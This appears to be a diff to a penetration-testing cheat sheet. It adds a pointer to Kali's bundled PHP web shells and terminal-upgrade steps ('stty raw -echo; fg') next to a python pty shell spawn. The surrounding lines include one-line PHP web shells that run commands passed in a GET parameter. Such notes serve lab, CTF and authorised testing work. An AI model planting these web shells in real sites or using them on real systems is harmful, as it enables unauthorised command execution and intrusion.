@@ -185,6 +185,7 @@ or
 
 ### PHP
 
+on kali /usr/share/webshells/php
 ```php
 <?php echo shell_exec($_GET['cmd']);?>
 <?php system($_GET['cmd']);?>
@@ -338,6 +339,9 @@ Located at '/usr/share/laudanum'
 ``` python
 python -c 'import pty;pty.spawn("/bin/bash")';
 ```
+`ctrl + z`
+
+stty raw -echo; fg 
 
 ## Spawn an upgraded shell
 
